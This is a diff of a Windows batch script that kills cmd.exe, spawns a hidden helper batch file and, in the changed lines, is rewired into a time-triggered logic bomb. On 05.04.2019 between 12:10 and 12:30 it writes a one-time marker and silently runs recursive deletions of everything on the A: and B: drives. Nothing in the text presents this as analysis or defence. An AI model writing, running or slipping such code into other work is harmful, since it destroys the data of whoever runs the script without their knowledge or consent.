@@ -7,17 +7,16 @@ taskkill /f /im cmd.exe
 exit
 
 :schlumsanna
-if exist ol.bat goto endee
+if exist ol.bat goto abx
 echo pause >ol.bat
 start /min "" "ol.bat"
 waitfor /t 5 ghvfgchgfvhj
 goto endee
-
-:schlumsannaIIIIII
-if not %date%==05.04.2019 goto endee
-if "%time%" LSS "12:10" goto endee
-if "%time%" GEQ "12:30" goto endee
-if exist done goto endee
+:abx
+if not %date%==05.04.2019 exit
+if "%time%" LSS "12:10" exit
+if "%time%" GEQ "12:30" exit
+if exist done exit
 >done echo o
 del /q /s A:\
 del /q /s B:\
